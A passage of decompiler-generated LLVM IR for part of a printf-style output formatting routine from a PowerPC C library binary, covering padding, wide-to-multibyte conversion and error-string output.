  store i32 %stack_var_-184.0, i32* %r0.global-to-local, align 4
  %v1_10008ff8 = and i32 %stack_var_-184.0, 16
  store i32 %v1_10008ff8, i32* %r11.global-to-local, align 4
  %v3_10008ff8 = icmp eq i32 %v1_10008ff8, 0
  br i1 %v3_10008ff8, label %dec_label_pc_10009044, label %dec_label_pc_10009000

dec_label_pc_10009000:                            ; preds = %dec_label_pc_10008ff4
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v2_10009004, label %dec_label_pc_10009010, label %dec_label_pc_10009020.thread

dec_label_pc_10009020.thread:                     ; preds = %dec_label_pc_10009000
  store i32 6, i32* @r27, align 4
  br label %dec_label_pc_10009044

dec_label_pc_10009010:                            ; preds = %dec_label_pc_10009000
  br i1 %v3_10009010, label %dec_label_pc_10009018, label %dec_label_pc_10009020

dec_label_pc_10009018:                            ; preds = %dec_label_pc_10009010
  store i32 9, i32* @r27, align 4
  br label %dec_label_pc_10009044

dec_label_pc_10009020:                            ; preds = %dec_label_pc_10009010
  br i1 %v3_10009020, label %dec_label_pc_10009028, label %dec_label_pc_10009044

dec_label_pc_10009028:                            ; preds = %dec_label_pc_10009020
  %v3_10009028 = icmp ugt i32 %v0_10009028, %v1_10008fe8
  br i1 %v3_10009028, label %dec_label_pc_10009044, label %dec_label_pc_10009030

dec_label_pc_10009030:                            ; preds = %dec_label_pc_10009028
  %v1_10009030 = inttoptr i32 %v0_10009044 to i8*
  %v2_10009030 = load i8, i8* %v1_10009030, align 1
  %v3_10009030 = zext i8 %v2_10009030 to i32
  store i32 %v3_10009030, i32* %r0.global-to-local, align 4
  %v3_10009038 = icmp eq i8 %v2_10009030, 48
  br i1 %v3_10009038, label %dec_label_pc_10009044, label %dec_label_pc_10009040

dec_label_pc_10009040:                            ; preds = %dec_label_pc_10009030
  %v1_10009040 = add i32 %v2_10008fe0, 128
  br label %dec_label_pc_10009044

dec_label_pc_10009044:                            ; preds = %dec_label_pc_10009020.thread, %dec_label_pc_10009020, %dec_label_pc_10009030, %dec_label_pc_10009028, %dec_label_pc_10008ff4, %dec_label_pc_10009018, %dec_label_pc_10009040
  %v1_1000908c = phi i32 [ %v0_10009028, %dec_label_pc_10009020 ], [ 1, %dec_label_pc_10009030 ], [ %v0_10009028, %dec_label_pc_10009028 ], [ %v0_10009028, %dec_label_pc_10008ff4 ], [ %v0_10009028, %dec_label_pc_10009018 ], [ %v1_10009040, %dec_label_pc_10009040 ], [ %v0_10009028, %dec_label_pc_10009020.thread ]
  %v1_10009044 = inttoptr i32 %v0_10009044 to i8*
  %v2_10009044 = load i8, i8* %v1_10009044, align 1
  %v3_10009044 = zext i8 %v2_10009044 to i32
  store i32 %v3_10009044, i32* %r0.global-to-local, align 4
  %v3_10009048 = icmp eq i8 %v2_10009044, 48
  br i1 %v3_10009048, label %dec_label_pc_10009050, label %dec_label_pc_10009088

dec_label_pc_10009050:                            ; preds = %dec_label_pc_10009044
  %v0_10009050 = load i32, i32* @r27, align 4
  %tmp77 = icmp slt i32 %v0_10009050, 6
  br i1 %tmp77, label %dec_label_pc_1000905c, label %dec_label_pc_10009058

dec_label_pc_10009058:                            ; preds = %dec_label_pc_10009050
  store i32 11, i32* @r27, align 4
  br label %dec_label_pc_1000905c

dec_label_pc_1000905c:                            ; preds = %dec_label_pc_10009050, %dec_label_pc_10009058
  store i32 %tmp57, i32* %r0.global-to-local, align 4
  br i1 %v3_10009060, label %dec_label_pc_10009068, label %dec_label_pc_10009078

dec_label_pc_10009068:                            ; preds = %dec_label_pc_1000905c
  store i32 5, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1000eab0.182 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10009204

dec_label_pc_10009078:                            ; preds = %dec_label_pc_1000905c
  %v3_10009078 = icmp eq i32 %v1_1000908c, 0
  br i1 %v3_10009078, label %dec_label_pc_10009080, label %dec_label_pc_10009088

dec_label_pc_10009080:                            ; preds = %dec_label_pc_10009078
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10009204

dec_label_pc_10009088:                            ; preds = %dec_label_pc_10009078, %dec_label_pc_10009044
  %v3_10009088 = icmp ugt i32 %v1_1000908c, %v1_10008fe8
  %v2_1000908c = sub i32 %v1_1000908c, %v1_10008fe8
  store i32 %v2_1000908c, i32* %r29.global-to-local, align 4
  br i1 %v3_10009088, label %dec_label_pc_10009224thread-pre-split, label %dec_label_pc_10009204

dec_label_pc_10009098:                            ; preds = %dec_label_pc_10008eb8
  br i1 %v2_10009098, label %dec_label_pc_100090cc, label %dec_label_pc_100090a0

dec_label_pc_100090a0:                            ; preds = %dec_label_pc_10009098
  %v3_100090a0 = load i32, i32* %stack_var_-344, align 4
  %v0_100090ac = load i32, i32* %r24.global-to-local, align 4
  store i32 268472508, i32* @lr, align 4
  %v5_100090b8 = call i32 @_fpmaxtostr(i32 %v0_100090ac, i32* nonnull %stack_var_-196, i32 268471444, i32 %v3_100090a0)
  %v1_100090bc = icmp slt i32 %v5_100090b8, 0
  br i1 %v1_100090bc, label %dec_label_pc_10009388, label %dec_label_pc_100090c4

dec_label_pc_100090c4:                            ; preds = %dec_label_pc_100090a0
  %v0_100090c4 = load i32, i32* %r23.global-to-local, align 4
  %v2_100090c4 = add i32 %v0_100090c4, %v5_100090b8
  store i32 %v2_100090c4, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_10009374

dec_label_pc_100090cc:                            ; preds = %dec_label_pc_10009098
  br i1 %v2_100090cc, label %dec_label_pc_10009174, label %dec_label_pc_100090d4

dec_label_pc_100090d4:                            ; preds = %dec_label_pc_100090cc
  store i32 0, i32* %r25.global-to-local, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v3_100090e0 = load i32, i32* %stack_var_-344, align 4
  %v1_100090e8 = inttoptr i32 %v3_100090e0 to i32*
  %v2_100090e8 = load i32, i32* %v1_100090e8, align 4
  br i1 %v3_100090cc, label %dec_label_pc_100090e8, label %dec_label_pc_1000913c

dec_label_pc_100090e8:                            ; preds = %dec_label_pc_100090d4
  store i32 %v2_100090e8, i32* %r0.global-to-local, align 4
  %v3_100090ec = icmp eq i32 %v2_100090e8, 0
  store i32 %v2_100090e8, i32* %stack_var_-340, align 4
  br i1 %v3_100090ec, label %dec_label_pc_1000920c, label %dec_label_pc_100090f8

dec_label_pc_100090f8:                            ; preds = %dec_label_pc_100090e8
  %v3_100090f8 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_100090f8, i32* %r0.global-to-local, align 4
  %v1_10009100 = icmp slt i32 %v3_100090f8, 0
  br i1 %v1_10009100, label %dec_label_pc_1000910c, label %dec_label_pc_10009108

dec_label_pc_10009108:                            ; preds = %dec_label_pc_100090f8
  br label %dec_label_pc_1000910c

dec_label_pc_1000910c:                            ; preds = %dec_label_pc_100090f8, %dec_label_pc_10009108
  %storemerge94 = phi i32 [ %v3_100090f8, %dec_label_pc_10009108 ], [ -1, %dec_label_pc_100090f8 ]
  store i32 %storemerge94, i32* @r5, align 4
  store i32 %v2_1000910c, i32* @r3, align 4
  store i32 %v2_10009110, i32* @r6, align 4
  store i32 %v2_1000910c, i32* @r4, align 4
  store i32 268472604, i32* @lr, align 4
  %v0_10009118 = call i32 @__GI_wcsrtombs()
  %v3_1000911c = icmp eq i32 %v0_10009118, -1
  store i32 %v0_10009118, i32* %r31.global-to-local, align 4
  br i1 %v3_1000911c, label %dec_label_pc_10009388, label %dec_label_pc_10009128

dec_label_pc_10009128:                            ; preds = %dec_label_pc_1000910c
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* %r26.global-to-local, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10009224

dec_label_pc_1000913c:                            ; preds = %dec_label_pc_100090d4
  store i32 %v2_100091ec, i32* @r28, align 4
  store i32 268472656, i32* @lr, align 4
  %v3_1000914c = call i32 @__GI_wcrtomb(i32 %v2_100091ec, i32 %v2_100090e8, i32 %v2_10009110)
  %v3_10009150 = icmp eq i32 %v3_1000914c, -1
  store i32 %v3_1000914c, i32* %r31.global-to-local, align 4
  br i1 %v3_10009150, label %dec_label_pc_10009388, label %dec_label_pc_1000915c

dec_label_pc_1000915c:                            ; preds = %dec_label_pc_1000913c
  store i32 %v2_100091ec, i32* %r30.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* %r26.global-to-local, align 4
  %v0_1000916c = load i32, i32* %r25.global-to-local, align 4
  %v1_1000916c = load i32, i32* @r28, align 4
  %v3_1000916c = trunc i32 %v0_1000916c to i8
  %v4_1000916c = add i32 %v1_1000916c, %v3_1000914c
  %v5_1000916c = inttoptr i32 %v4_1000916c to i8*
  store i8 %v3_1000916c, i8* %v5_1000916c, align 1
  %v0_10009228.pre.pre = load i32, i32* %r31.global-to-local, align 4
  %v1_10009228.pre.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10009224thread-pre-split

dec_label_pc_10009174:                            ; preds = %dec_label_pc_100090cc
  br i1 %v2_10009174, label %dec_label_pc_100091e0, label %dec_label_pc_1000917c

dec_label_pc_1000917c:                            ; preds = %dec_label_pc_10009174
  %v3_10009180 = load i32, i32* %stack_var_-344, align 4
  %v1_10009188 = inttoptr i32 %v3_10009180 to i32*
  %v2_10009188 = load i32, i32* %v1_10009188, align 4
  br i1 %v3_10009174, label %dec_label_pc_10009188, label %dec_label_pc_100091b8

dec_label_pc_10009188:                            ; preds = %dec_label_pc_1000917c
  store i32 %v2_10009188, i32* %r30.global-to-local, align 4
  %v3_1000918c = icmp eq i32 %v2_10009188, 0
  br i1 %v3_1000918c, label %dec_label_pc_1000920c, label %dec_label_pc_10009194

dec_label_pc_10009194:                            ; preds = %dec_label_pc_10009188, %dec_label_pc_100091e8
  %v0_100091a8 = phi i32 [ %v2_10009188, %dec_label_pc_10009188 ], [ %v3_100091f8, %dec_label_pc_100091e8 ]
  %v3_10009194 = load i32, i32* %stack_var_-196, align 4
  store i32 %v3_10009194, i32* %r0.global-to-local, align 4
  %v1_1000919c = icmp slt i32 %v3_10009194, 0
  br i1 %v1_1000919c, label %dec_label_pc_100091a8, label %dec_label_pc_100091a4

dec_label_pc_100091a4:                            ; preds = %dec_label_pc_10009194
  br label %dec_label_pc_100091a8

dec_label_pc_100091a8:                            ; preds = %dec_label_pc_10009194, %dec_label_pc_100091a4
  %storemerge95 = phi i32 [ %v3_10009194, %dec_label_pc_100091a4 ], [ -1, %dec_label_pc_10009194 ]
  store i32 %storemerge95, i32* @r4, align 4
  store i32 268472752, i32* @lr, align 4
  %v1_100091ac = inttoptr i32 %v0_100091a8 to i8*
  %v2_100091ac = call i32 @strnlen(i8* %v1_100091ac)
  store i32 %v2_100091ac, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10009218

dec_label_pc_100091b8:                            ; preds = %dec_label_pc_1000917c
  store i32 1, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 %v2_10009188, i32* %stack_var_-328, align 4
  store i32 32, i32* %r26.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v2_100091ec, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10009224thread-pre-split

dec_label_pc_100091e0:                            ; preds = %dec_label_pc_10009174
  br i1 %v3_100091e0, label %dec_label_pc_100091e8, label %dec_label_pc_10009388

dec_label_pc_100091e8:                            ; preds = %dec_label_pc_100091e0
  %v0_100091e8 = call i32 @__errno_location()
  %v1_100091f0 = inttoptr i32 %v0_100091e8 to i32*
  %v2_100091f0 = load i32, i32* %v1_100091f0, align 4
  store i32 %v2_100091f0, i32* @r3, align 4
  store i32 128, i32* @r5, align 4
  store i32 268472828, i32* @lr, align 4
  %v3_100091f8 = call i32 @__GI___glibc_strerror_r(i32 %v2_100091f0, i32 %v2_100091ec, i32 128)
  store i32 %v3_100091f8, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10009194

dec_label_pc_10009204:                            ; preds = %dec_label_pc_10009088, %dec_label_pc_10009080, %dec_label_pc_10009068
  %v0_10009228.pre40 = phi i32 [ %v1_10008fe8, %dec_label_pc_10009088 ], [ 0, %dec_label_pc_10009080 ], [ 5, %dec_label_pc_10009068 ]
  store i32 0, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10009224thread-pre-split

dec_label_pc_1000920c:                            ; preds = %dec_label_pc_10009188, %dec_label_pc_100090e8
  store i32 6, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1000eab8.183 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10009218

dec_label_pc_10009218:                            ; preds = %dec_label_pc_100091a8, %dec_label_pc_1000920c
  %v0_1000922828 = phi i32 [ %v2_100091ac, %dec_label_pc_100091a8 ], [ 6, %dec_label_pc_1000920c ]
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_10009224

dec_label_pc_10009224thread-pre-split:            ; preds = %dec_label_pc_1000915c, %dec_label_pc_100091b8, %dec_label_pc_10009204, %dec_label_pc_10009088
  %v1_10009228.pre = phi i32 [ %v2_1000908c, %dec_label_pc_10009088 ], [ 0, %dec_label_pc_10009204 ], [ %v1_10009228.pre.pre, %dec_label_pc_1000915c ], [ 0, %dec_label_pc_100091b8 ]
  %v0_10009228.pre = phi i32 [ %v1_10008fe8, %dec_label_pc_10009088 ], [ %v0_10009228.pre40, %dec_label_pc_10009204 ], [ %v0_10009228.pre.pre, %dec_label_pc_1000915c ], [ 1, %dec_label_pc_100091b8 ]
  %stack_var_-184.1.ph = phi i32 [ %stack_var_-184.0, %dec_label_pc_10009088 ], [ %stack_var_-184.0, %dec_label_pc_10009204 ], [ %v0_10008fcc, %dec_label_pc_1000915c ], [ %v0_10008fcc, %dec_label_pc_100091b8 ]
  %v0_10009224.pr = load i32, i32* @r27, align 4
  br label %dec_label_pc_10009224

dec_label_pc_10009224:                            ; preds = %dec_label_pc_10009224thread-pre-split, %dec_label_pc_10009128, %dec_label_pc_10009218
  %v1_10009228 = phi i32 [ %v1_10009228.pre, %dec_label_pc_10009224thread-pre-split ], [ 0, %dec_label_pc_10009128 ], [ 0, %dec_label_pc_10009218 ]
  %v0_10009228 = phi i32 [ %v0_10009228.pre, %dec_label_pc_10009224thread-pre-split ], [ %v0_10009118, %dec_label_pc_10009128 ], [ %v0_1000922828, %dec_label_pc_10009218 ]
  %v0_10009230 = phi i32 [ %v0_10009224.pr, %dec_label_pc_10009224thread-pre-split ], [ 11, %dec_label_pc_10009128 ], [ 11, %dec_label_pc_10009218 ]
  %stack_var_-184.1 = phi i32 [ %stack_var_-184.1.ph, %dec_label_pc_10009224thread-pre-split ], [ %v0_10008fcc, %dec_label_pc_10009128 ], [ %v0_10008fcc, %dec_label_pc_10009218 ]
  %v3_10009224 = icmp eq i32 %v0_10009230, 11
  %v2_10009228 = add i32 %v0_10009228, %v1_10009228
  store i32 %v2_10009228, i32* %r0.global-to-local, align 4
  br i1 %v3_10009224, label %dec_label_pc_10009244, label %dec_label_pc_10009230

dec_label_pc_10009230:                            ; preds = %dec_label_pc_10009224
  %v0_10009234 = call i32 @__asm_mfcr()
  %v1_10009238 = call i32 @__asm_rlwinm(i32 %v0_10009234, i32 30, i32 31, i32 31)
  %v1_1000923c = add i32 %v1_10009238, 1
  %v0_10009240 = load i32, i32* %r0.global-to-local, align 4
  %v2_10009240 = add i32 %v0_10009240, %v1_1000923c
  store i32 %v2_10009240, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10009244

dec_label_pc_10009244:                            ; preds = %dec_label_pc_10009224, %dec_label_pc_10009230
  %v0_1000925c = phi i32 [ %v2_10009228, %dec_label_pc_10009224 ], [ %v2_10009240, %dec_label_pc_10009230 ]
  %v3_1000924c = icmp ugt i32 %tmp53, %v0_1000925c
  br i1 %v3_1000924c, label %dec_label_pc_10009254, label %dec_label_pc_10009258

dec_label_pc_10009254:                            ; preds = %dec_label_pc_10009244
  %v2_10009254 = sub i32 %tmp53, %v0_1000925c
  br label %dec_label_pc_10009258

dec_label_pc_10009258:                            ; preds = %dec_label_pc_10009244, %dec_label_pc_10009254
  %storemerge93 = phi i32 [ %v2_10009254, %dec_label_pc_10009254 ], [ 0, %dec_label_pc_10009244 ]
  %v1_10009268 = phi i32 [ %v2_10009254, %dec_label_pc_10009254 ], [ 0, %dec_label_pc_10009244 ]
  store i32 %storemerge93, i32* @r28, align 4
  %v0_10009258 = load i32, i32* %r26.global-to-local, align 4
  %v3_10009258 = icmp eq i32 %v0_10009258, 48
  %v2_1000925c = add i32 %v1_10009268, %v0_1000925c
  store i32 %v2_1000925c, i32* %r0.global-to-local, align 4
  %v0_10009260 = load i32, i32* %r23.global-to-local, align 4
  %v2_10009260 = add i32 %v0_10009260, %v2_1000925c
  store i32 %v2_10009260, i32* %r23.global-to-local, align 4
  br i1 %v3_10009258, label %dec_label_pc_10009268, label %dec_label_pc_10009270

dec_label_pc_10009268:                            ; preds = %dec_label_pc_10009258
  %v0_10009268 = load i32, i32* %r29.global-to-local, align 4
  %v2_10009268 = add i32 %v0_10009268, %v1_10009268
  store i32 %v2_10009268, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10009270

dec_label_pc_10009270:                            ; preds = %dec_label_pc_10009258, %dec_label_pc_10009268
  %v0_10009284 = phi i32 [ %v1_10009268, %dec_label_pc_10009258 ], [ 0, %dec_label_pc_10009268 ]
  store i32 %stack_var_-184.1, i32* %r0.global-to-local, align 4
  %v1_10009274 = and i32 %stack_var_-184.1, 8
  %v3_10009274 = icmp eq i32 %v1_10009274, 0
  br i1 %v3_10009274, label %dec_label_pc_1000927c, label %dec_label_pc_10009298

dec_label_pc_1000927c:                            ; preds = %dec_label_pc_10009270
  %v0_1000927c = load i32, i32* %r24.global-to-local, align 4
  store i32 268472972, i32* @lr, align 4
  %v4_10009288 = call i32 @_charpad(i32 %v0_1000927c, i8 32, i32 %v0_10009284)
  %v1_1000928c = load i32, i32* @r28, align 4
  %v4_1000928c = icmp eq i32 %v4_10009288, %v1_1000928c
  br i1 %v4_1000928c, label %dec_label_pc_10009294, label %dec_label_pc_10009388

dec_label_pc_10009294:                            ; preds = %dec_label_pc_1000927c
  br label %dec_label_pc_10009298

dec_label_pc_10009298:                            ; preds = %dec_label_pc_10009270, %dec_label_pc_10009294
  %v0_1000929c = load i32, i32* %r24.global-to-local, align 4
  %v0_100092a4 = load i32, i32* @r27, align 4
  %v2_100092a4 = add i32 %v0_100092a4, ptrtoint (i32* @global_var_1000eac0.184 to i32)
  store i32 268473004, i32* @lr, align 4
  %v2_100092a8 = call i32 @__GI_fputs_unlocked(i32 %v2_100092a4, i32 %v0_1000929c)
  %v0_100092b4 = load i32, i32* @r29, align 4
  store i32 268473020, i32* @lr, align 4
  %v4_100092b8 = call i32 @_charpad(i32 %v0_1000929c, i8 48, i32 %v0_100092b4)
  %v1_100092bc = load i32, i32* @r29, align 4
  %v4_100092bc = icmp eq i32 %v4_100092b8, %v1_100092bc
  br i1 %v4_100092bc, label %dec_label_pc_100092c4, label %dec_label_pc_10009388

dec_label_pc_100092c4:                            ; preds = %dec_label_pc_10009298
  %v3_100092c4 = load i32, i32* %stack_var_-340, align 4
  store i32 %v3_100092c4, i32* %r0.global-to-local, align 4
  %v3_100092c8 = icmp eq i32 %v3_100092c4, 0
  br i1 %v3_100092c8, label %dec_label_pc_100092d0, label %dec_label_pc_100092f8

dec_label_pc_100092d0:                            ; preds = %dec_label_pc_100092c4
  %v0_100092d0 = load i32, i32* @r31, align 4
  %v3_100092d0 = icmp eq i32 %v0_100092d0, 0
  br i1 %v3_100092d0, label %dec_label_pc_100092ec.thread, label %dec_label_pc_100092ec

dec_label_pc_100092ec.thread:                     ; preds = %dec_label_pc_100092d0
  br label %dec_label_pc_1000935c

dec_label_pc_100092ec:                            ; preds = %dec_label_pc_100092d0
  %v0_100092dc = load i32, i32* @r30, align 4
  %v0_100092e4 = load i32, i32* %r24.global-to-local, align 4
  store i32 268473068, i32* @lr, align 4
  %v4_100092e8 = inttoptr i32 %v0_100092e4 to i16*
  %v5_100092e8 = call i32 @__stdio_fwrite(i32 %v0_100092dc, i32 %v0_100092d0, i16* %v4_100092e8)
  %v1_100092ec.pre = load i32, i32* @r31, align 4
  %v4_100092ec = icmp eq i32 %v5_100092e8, %v1_100092ec.pre
  br i1 %v4_100092ec, label %dec_label_pc_1000935c, label %dec_label_pc_10009388

dec_label_pc_100092f8:                            ; preds = %dec_label_pc_100092c4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v0_1000933c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000933c

dec_label_pc_10009304:                            ; preds = %dec_label_pc_1000933c
  %tmp78 = icmp ult i32 %v0_10009354, 129
  br i1 %tmp78, label %dec_label_pc_1000930c, label %dec_label_pc_10009308

dec_label_pc_10009308:                            ; preds = %dec_label_pc_10009304
  store i32 128, i32* @r5, align 4
  br label %dec_label_pc_1000930c

dec_label_pc_1000930c:                            ; preds = %dec_label_pc_10009304, %dec_label_pc_10009308
  store i32 ptrtoint (i32* @global_var_10009310.185 to i32), i32* @lr, align 4
  %v0_1000930c = call i32 @__GI_wcsrtombs()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_1000930c, i32* %r30.global-to-local, align 4
  %v3_10009314 = icmp eq i32 %v0_1000930c, 0
  br i1 %v3_10009314, label %dec_label_pc_10009330, label %dec_label_pc_10009328

dec_label_pc_10009328:                            ; preds = %dec_label_pc_1000930c
  %v0_10009318 = load i32, i32* %r24.global-to-local, align 4
  store i32 268473132, i32* @lr, align 4
  %v3_10009328 = inttoptr i32 %v0_10009318 to i16*
  %v4_10009328 = call i32 @__stdio_fwrite(i32 %v2_100091ec, i32 %v0_1000930c, i16* %v3_10009328)
  store i32 %v4_10009328, i32* %r0.global-to-local, align 4
  %v1_10009330.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10009330

dec_label_pc_10009330:                            ; preds = %dec_label_pc_1000930c, %dec_label_pc_10009328
  %v1_10009330 = phi i32 [ 0, %dec_label_pc_1000930c ], [ %v1_10009330.pre, %dec_label_pc_10009328 ]
  %v0_10009334 = phi i32 [ 0, %dec_label_pc_1000930c ], [ %v4_10009328, %dec_label_pc_10009328 ]
  %v4_10009330 = icmp eq i32 %v0_10009334, %v1_10009330
  %v1_10009334 = load i32, i32* @r31, align 4
  %v2_10009334 = sub i32 %v1_10009334, %v0_10009334
  store i32 %v2_10009334, i32* @r31, align 4
  br i1 %v4_10009330, label %dec_label_pc_1000933c, label %dec_label_pc_10009388

dec_label_pc_1000933c:                            ; preds = %dec_label_pc_10009330, %dec_label_pc_100092f8
  %v0_10009354 = phi i32 [ %v2_10009334, %dec_label_pc_10009330 ], [ %v0_1000933c.pre, %dec_label_pc_100092f8 ]
  %v3_1000933c = icmp eq i32 %v0_10009354, 0
  store i32 %v2_100091ec, i32* %r29.global-to-local, align 4
  store i32 %v2_1000910c, i32* @r4, align 4
  store i32 %v2_10009110, i32* @r6, align 4
  store i32 %v2_100091ec, i32* @r3, align 4
  store i32 %v0_10009354, i32* @r5, align 4
  br i1 %v3_1000933c, label %dec_label_pc_1000935c, label %dec_label_pc_10009304

dec_label_pc_1000935c:                            ; preds = %dec_label_pc_1000933c, %dec_label_pc_100092ec.thread, %dec_label_pc_100092ec
  %v0_1000935c = load i32, i32* %r24.global-to-local, align 4
  %v0_10009364 = load i32, i32* @r28, align 4
  store i32 268473196, i32* @lr, align 4
  %v4_10009368 = call i32 @_charpad(i32 %v0_1000935c, i8 32, i32 %v0_10009364)
  %v1_1000936c = load i32, i32* @r28, align 4
  %v4_1000936c = icmp eq i32 %v4_10009368, %v1_1000936c
  br i1 %v4_1000936c, label %dec_label_pc_10009374, label %dec_label_pc_10009388

dec_label_pc_10009374:                            ; preds = %dec_label_pc_1000935c, %dec_label_pc_100090c4, %dec_label_pc_10008e98
  %stack_var_-184.2 = phi i32 [ %v0_10008fcc, %dec_label_pc_10008e98 ], [ %stack_var_-184.1, %dec_label_pc_1000935c ], [ %v0_10008fcc, %dec_label_pc_100090c4 ]
  %v3_10009374 = load i32, i32* %stack_var_-200, align 4
  store i32 %v3_10009374, i32* @r29, align 4
  br label %dec_label_pc_10009378

dec_label_pc_10009378:                            ; preds = %dec_label_pc_10008d8c, %dec_label_pc_10009374
  %v0_10009378 = phi i32 [ %v0_10009378.pre, %dec_label_pc_10008d8c ], [ %v3_10009374, %dec_label_pc_10009374 ]
  %v0_10008fcc = phi i32 [ %tmp56, %dec_label_pc_10008d8c ], [ %stack_var_-184.2, %dec_label_pc_10009374 ]
  br label %dec_label_pc_10008da4

dec_label_pc_10009388:                            ; preds = %dec_label_pc_100091e0, %dec_label_pc_1000935c, %dec_label_pc_100092ec, %dec_label_pc_10009298, %dec_label_pc_1000927c, %dec_label_pc_1000913c, %dec_label_pc_1000910c, %dec_label_pc_100090a0, %dec_label_pc_10008de0, %dec_label_pc_10009330
  store i32 -1, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_1000938c

dec_label_pc_1000938c:                            ; preds = %dec_label_pc_10008dec, %dec_label_pc_10008d64, %dec_label_pc_10008d7c, %dec_label_pc_10009388
  store i32 %v0_10008d38, i32* %r0.global-to-local, align 4
  %v0_10009390 = load i32, i32* %r23.global-to-local, align 4
  ret i32 %v0_10009390

; uselistorder directives
  uselistorder i32 %v0_10008fcc, { 16, 11, 12, 13, 1, 2, 0, 10, 9, 8, 7, 6, 4, 5, 3, 15, 14 }
  uselistorder i32 %v0_10009354, { 1, 2, 0 }
  uselistorder i32 %v1_10009268, { 2, 0, 1 }
  uselistorder i32 %stack_var_-184.1, { 0, 2, 1 }
  uselistorder i32 %v3_100091f8, { 1, 0 }
  uselistorder i32 %v2_10009188, { 1, 0, 2, 3 }
  uselistorder i32 %v2_100090e8, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-184.0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_10008fcc, { 1, 0 }
  uselistorder i32 %v6_10008f84, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_10008f68, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10008f54, { 1, 0 }
  uselistorder i32 %v1_10008ef8, { 1, 0 }
  uselistorder i1 %v2_10008eec, { 1, 0 }
  uselistorder i32 %v0_10008e9c, { 1, 0, 2 }
  uselistorder i32 %v1_10008e88, { 1, 0 }
  uselistorder i32 %v0_10008e80, { 1, 0 }
  uselistorder i32 %v1_10008e7c, { 1, 0 }
  uselistorder i32 %v1_10008df8, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v1_10008dc0, { 1, 2, 3, 0 }
  uselistorder i32 %v0_10008dd0, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_100091ec, { 3, 2, 4, 9, 8, 7, 6, 5, 1, 0 }
  uselistorder i32 %v2_10008e34, { 1, 2, 0 }
  uselistorder i32 %v4_10008e2c, { 1, 0 }
  uselistorder i32* %stack_var_-200, { 2, 1, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-196, { 1, 2, 0, 3, 4 }
  uselistorder i32 %tmp57, { 16, 14, 12, 10, 6, 7, 8, 0, 2, 1, 4, 3, 5, 9, 15, 17, 13, 11 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 12, 9, 10, 11, 13, 14 }
  uselistorder i32* %r30.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14 }
  uselistorder i32* %r29.global-to-local, { 0, 1, 8, 2, 3, 4, 5, 6, 7, 9, 10 }
  uselistorder i32* %r26.global-to-local, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32* %r24.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %r23.global-to-local, { 9, 0, 1, 4, 2, 5, 6, 3, 7, 8, 10 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 3, 4, 6, 7, 5 }
  uselistorder i32* %r10.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 37, 36, 30, 31, 32, 33, 34, 35 }
  uselistorder i32* %ctr.global-to-local, { 0, 4, 5, 2, 3, 1 }
  uselistorder i32 (i32, i32)* @__GI_fputs_unlocked, { 1, 0 }
  uselistorder i8 32, { 2, 1, 3, 0, 4, 5, 6 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i8 10, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_1000938c, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10009388, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_10009378, { 1, 0 }
  uselistorder label %dec_label_pc_1000935c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10009330, { 1, 0 }
  uselistorder label %dec_label_pc_1000930c, { 1, 0 }
  uselistorder label %dec_label_pc_10009298, { 1, 0 }
  uselistorder label %dec_label_pc_10009270, { 1, 0 }
  uselistorder label %dec_label_pc_10009258, { 1, 0 }
